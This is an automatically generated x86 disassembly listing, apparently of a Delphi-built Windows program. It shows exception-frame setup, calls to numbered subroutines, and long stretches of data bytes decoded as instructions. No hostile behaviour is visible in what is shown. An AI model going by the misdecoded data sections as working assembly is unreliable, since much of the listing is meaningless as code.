pop ecx
mov [ fs : eax ] edx
push sub_421297
retn
mov eax [ rw-data ]
call sub_419dc0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_420fb8
xor edx edx
xor eax eax
call sub_41d1e8
mov eax rw-data
call sub_40d788
call sub_406138
lea eax [ eax + 0xc ]
call sub_40d788
mov eax rw-data
call sub_40d788
mov eax rw-data
call sub_405a08
mov eax sub_421024
call sub_4058a4
mov eax rw-data
call sub_40d788
call sub_41fde4
mov eax rw-data
call sub_40d788
mov eax rw-data
call sub_405a08
sub_42129c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421325
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42132c
retn
call sub_41fdb0
mov eax sub_421024
call sub_40589c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d4c8
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405a20
mov dl 0x1
mov eax [ r-xdata ]
call sub_4196bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a820
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a820
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421330
push 0x77004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax - 0x1 ] bh
add [ eax ] al
push 0x79004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx - 0x1 ] bh
add [ eax ] al
push 0x7b004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] bh
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] ch
add [ eax ] al
push 0x2d004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ esi ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi ] dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ecx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ ebx ] bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ edi + edi * 8 ] bl
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421685
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42168c
retn
sub_421698
pushfd
push ss
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
cld
push ss
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ss
inc edx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x17 ] bx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x17 ] bl
inc edx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
js r-xdata
jae r-xdata
popad
insd
nop
int3
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
call 0x3425a00
or dl [ esi + eax * 2 + 0x6f ]
je r-xdata
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
pop es
inc edx
outsd
outsb
je r-xdata
add [ ecx ] cl
jo r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edi + edx + 0x42 ] dh
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + ebx + 0x70070042 ] dh
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
pop ss
inc edx
add [ ebx + 0x421850c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
in al 0x17
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
pop ss
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
je r-xdata
popa
jne r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x1838c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + ebx + 0x42 ] cl
add [ edi ] al
jo r-xdata
outsd
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4217bc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
pushad
sbb al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb al [ edx ]
dec esp
sbb al [ edx ]
sbb [ eax ] al
add [ eax ] al
js r-xdata
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4218b890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1a ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx + 0x42 ] al
jae r-xdata
shl [ ecx + ebx + 0x42 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
jo r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
jb r-xdata
inc ebx
inc ecx
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
insb
popad
bound esi [ ebx + 0x43 ]
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x19 ] dh
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x1a ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
dec ebp
push eax
outsb
insb
inc esp
popad
jae r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
in al 0x17
popad
jb r-xdata
xor [ edx ] al
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
mov eax eax
je r-xdata
inc edi
jb r-xdata
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
pushfd
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add al cl
stosd [ edi ]
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add [ eax - 0x7d ] bh
inc edx
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
cmp al 0x1b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
sbb eax [ edx ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi + 0x1a ] si
inc edx
add ah ch
add [ ecx ] 0x0
add [ eax ] cl
inc edi
jb r-xdata
[ eax ]
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc edx
push 0x6c797453
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
nop
inc edi
cmp [ edx ] bl
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x1974c08b
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
sbb [ edx ] eax
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
jb r-xdata
sbb eax [ edx ]
pop es
add eax 0x6e6f4654
je r-xdata
xor bl [ ebx ]
inc edx
add [ eax + eax ] ah
add [ eax ] al
in al dx
jo r-xdata
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x421a3890
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ edx + ebx + 0x42 ] cl
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
je r-xdata
popad
sbb eax [ edx ]
pop esp
sbb al [ edx ]
pop es
add [ eax ] cl
inc edi
jb r-xdata
sbb [ edx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] ch
xor eax [ edx ]
lodsb [ esi ]
lodsb [ esi ]
inc ecx
add [ esp + ebp * 4 + 0x336c0041 ] dh
inc edx
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ edx ] ds
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
mov [ edx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x421c ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x1c0042 ] dl
add [ eax ] al
in al dx
sbb [ edx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax + edi + 0x42 ] al
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add [ eax + edi + 0x42 ] ch
add [ esp + edx * 2 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2000421a ] cl
add [ ebx + esi + 0x42 ] ch
push ss
inc edx
add [ eax ] bl
add [ eax ] al
[ eax + 0x1004234 ]
mov eax 0xb8004217
inc edx
add al dl
imul esp [ ebx + 0x73 ] 0x17c80007
inc edx
add al dl
aaa
inc edx
add al bl
aaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
je r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x4217b874
add [ eax - 0x2fffbdca ] bh
jo r-xdata
inc eax
add [ eax ] cl
xor al [ eax ]
sub [ ebx ] dh
inc edx
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
imul sp [ ebp + 0x72 ] 0x11b4
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
mov eax 0xc000423a
cmp al [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul esp [ ebx + 0x73 ] 0x16980004
inc edx
add [ ecx + edi + 0x39940042 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
push r-xdata
sub al 0x37
inc edx
add [ eax + 0x37 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
push 0x74004237
aaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add [ 0x63746950 ] al
inc edx
add [ eax - 0x57ffbdc9 ] ah
aaa
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
jae r-xdata
push eax
outsb
lea eax [ eax ]
mov al [ 0x700421c ]
add al 0x54
push eax
outsb
mov [ edx + eax * 2 ] bl
add [ edx + ebx + 0x42 ] bl
add [ eax + eax ] al
insb
cmp [ edx ] al
add al 0x54
sbb [ edx ] al
sbb [ eax ] al
add bh bh
je r-xdata
add [ eax ] al
add [ ecx ] al
add ch bh
call [ eax + 0x33 ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
add [ eax ] al
mov [ edx ] bl
inc edx
add [ eax ] ah
imul esp [ ebx + 0x73 ] 0xffff0001
nop
or al 0x1b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sbb eax [ edx ]
test al 0x34
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] dh
nop
mov al [ 0x700421d ]
push es
push esp
inc edx
jb r-xdata
add eax [ eax ]
add eax 0x74646957
push 0x1d88c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x421d ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x180042 ] dl
add [ eax ] al
in al dx
sbb [ edx ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ ebx + edi ] ch
inc edx
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add [ ebx + edi + 0x42 ] dl
add [ esi ] al
push esp
inc edx
jb r-xdata
cmp al [ edx ]
sar [ edx ] 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x4c65646f ] al
sbb [ edx ] al
mov [ edx ] bh
inc edx
add [ eax + 0x100423a ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
jns r-xdata
jae r-xdata
sbb al [ edx ]
add al [ eax ]
or [ edi + 0x72 ] al
popad
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
test al 0x3e
inc edx
add [ esp + ebp * 4 - 0x534bffbf ] ch
inc ecx
add al cl
stosd [ edi ]
inc ecx
add [ esp + esi + 0x34a80040 ] bl
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x42 ] ah
jae r-xdata
jb r-xdata
outsd
cmp [ gs : ebx ] bl
inc edx
add [ eax + eax ] cl
add bh bh
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push ds
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] bl
add [ eax ] al
js r-xdata
push ds
inc edx
imul esp [ ebx + 0x73 ] 0x16980002
inc edx
add [ esp + edi + 0x3c940042 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
jo r-xdata
mov [ 0x1a5c0042 ] bl
inc edx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
jae r-xdata
add [ ebp + ebx + 0x140042 ] bl
sbb al 0x42
add [ eax ] dl
add [ eax ] al
jmp [ esp + eax * 2 + 0x10042 ]
xchg esp eax
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
inc ecx
add ah dh
inc esi
inc edx
add al ah
inc esi
inc edx
add [ esi + eax * 2 ] dl
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ esp + ebp * 4 - 0x5437ffbf ] dh
sbb [ edx ] eax
test al 0x3d
inc edx
add [ eax + 0x100423d ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
dec esp
push ds
inc edx
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
popad
jae r-xdata
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
push ds
inc edx
add ah ch
add [ ecx ] 0x4
add [ eax ] cl
inc edi
jb r-xdata
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
pop ds
inc edx
add [ edx ] cl
jo r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
or [ eax + 0x73 ] dh
inc ebp
dec ebp
add al 0x46
add [ edx ] 0x0
jo r-xdata
retn
push ebx
je r-xdata
add [ ecx + edx ] al
outsd
outsb
add al 0x42
jns r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
add bh bh
mov al 0x44
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
imul esp [ ebx + 0x73 ] 0x1d9c0004
inc edx
add [ eax + eax ] dl
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
outsd
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
sbb esp [ eax ]
inc edx
add cl ch
pop ds
inc edx
push es
inc eax
add [ eax - 0x233f7c34 ] dl
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
inc eax
jb r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
